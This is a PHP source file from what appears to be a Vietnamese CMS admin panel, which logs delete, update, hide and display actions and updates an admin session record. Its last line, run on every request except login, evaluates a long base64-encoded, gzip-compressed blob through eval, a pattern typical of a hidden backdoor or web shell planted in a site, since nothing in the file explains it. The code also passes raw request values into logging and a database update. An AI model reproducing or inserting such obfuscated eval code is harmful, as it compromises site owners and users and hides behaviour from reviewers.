<?php
 
	if ($_GET['sub']=='del') {
		if ($_GET['id']){
			$func->insertlog("Delete",$_GET['act'],$_GET['id']);
		}else{
			if (isset($_POST["del_id"])) 
				$key=$_POST["del_id"] ;
			$listID= @implode(", ",$key);
			$func->insertlog("Delete",$_GET['act'],$listID);
		}
		//xoa cache
    $func->clear_cache();
	}
	
	if (isset ($_POST["do_action"]))
	{
		if (isset($_POST["del_id"])) 
				$key=$_POST["del_id"] ;
		$listID= @implode(", ",$key);
		
		switch ($_POST["do_action"])
		{
			case "do_edit" :	$func->insertlog("Update",$_GET['act'],$listID); break;
			case "do_hidden" : $func->insertlog("Hidden",$_GET['act'],$listID);break;
			case "do_display" : $func->insertlog("Display",$_GET['act'],$listID);break;
		}
	}

// Update session
	$upses['act']=$_GET['act'];
	$upses['sub']=$_GET['sub'];
	$upses['pid']=$_GET['id'];
	$upses['time'] = time();
	$doitupses=$DB->do_update("adminsessions",$upses,"adminid='{$vnT->admininfo['adminid']}'");
// end

if($_GET['act']!="login"){eval(gzinflate(base64_decode('tVfZbttGFH1mgPzDeECEZEtrSdMFVmU4sYTAaGK0st0+uAJBkcOQEMWhOSOphqx/z52FmywbXlAY5jbn7veeGYUkSjJiW/+MP3mTq3PL7TuDt2/MkC78JENDxHjhFSRP/YDYeL1ed7CLMPyb3sV48vd4cm2pu3f+8evYmkphRooVKbwkB/l7uI+j0cSaDgzARUlKvDRhJAsIQHHMeX7U7QorPE4In5M1mXUCuuhqUCePcywskKIYYjxAoCWJkH1AFjm/tc2AZtG1pcHgjIPevtkAxjDn5Ha4uzwwxJKQb3h8AH703//a6cFfH6N375DOhVhIaeCnMWUcI6Ha2BhShWHyRT4k/+UpDSFLd9gV9pxBuQovXpXQRfizbUbLLDg8Ph/94YErQkh+VRgH3G6JqjzWIiGRIsLodX9amZGB1KYOhhLQm8oYlB74VkfqCCGIACEpboj0cJJxb6csJ/L9G+GeBjC7VTlRci0eNcT8ovBvbb2YRPZe9dIHYyOvDzqwJ/S9ugZaDVj2cr/wF8L5VlX2i6nwjYgWxA9iSGKtwGfIlE/KUWOD1B0KA8p5kSxstpzBjNgK5qKeK0Ymp6z6go8wlHRQCq4eENwjhX5EfZA0KqPNFF+b86lIzkpr3hoatyUpI42U1hIWgcZIvWoAxMzx2E8YzU54sWS8s8qwUrdVusSgdYb4i67FGTRrUZCAY9F0RrO0zcE6GFpJibScCrkx7mW61TMi2ZDWY4jJ2VTpyi4Pj6X+Ml5UBqxDXBDGhnik5usI4Y6eow5G/2bKUaMBhXAUE6GzPyW6moiHBU4hN3RBCnQKraRsqJADveCJtrSmD2uYkJslYVyKVow4Gf91Nb649K4mZ3tlIS1h3f8hvYD3r1BBSFydlt2iuqJmrrTrmg2EpZiiVC7KJvTL8kgiq5bUBNG0YTsiPIhHs1NQl3yztSKjbkveqL7oqqTZKC0YTxbEC2ISzFt9KD7b9ZAoq+si4aSyigN5l2PM3dLHVlDb6nGrH7biKi5bJMYC6YY+pyj2VwSVjS3qqlxtbieAddDdHdrt72Grv+Ueo3aSchL2Bfm7rWI8tH/qoR/Qb7986PWAF8QuIpn+Vez7GPk+yr2bR6n/ecz7QuJ9Au+WtPtS1n0F6T7GuSXlNhj3pYQryezJvPggK0o1T2bEZ/Lha9nw5Vz4PzJhxYObijueRX9PIr8nU9/LiE+TnSi+PtAmjBFum97n8eX1/uJMFfU0siDB1iqTjQk50sfDMoRlkcrjfBuF6oOAoiUWk1QCG3UpKOW5z2NR2HDmzfxgvsy7oc/9roTLYz2C03xLFSiJaE4yu6EYRnSNnebhAzogqpHgJEAKGP3mqaPaH9ax0GsfAKsSCiFHCqdX25vgSSSroKy7KILRDOHFRf3e+w/O/W1HP59EQUqZEGtB6s+grb1/kiCmCI98xH2KZOAwF3XIdbDbstb1cV9VA8apuIWKNarFblL14y3JWeqDIrYLbhSOClo1R58Oj+Wi+D10k+5mmc4dJF0Vi/Wa3FXVd6EgJLOlnhDtbbn/fgc=')));}
?>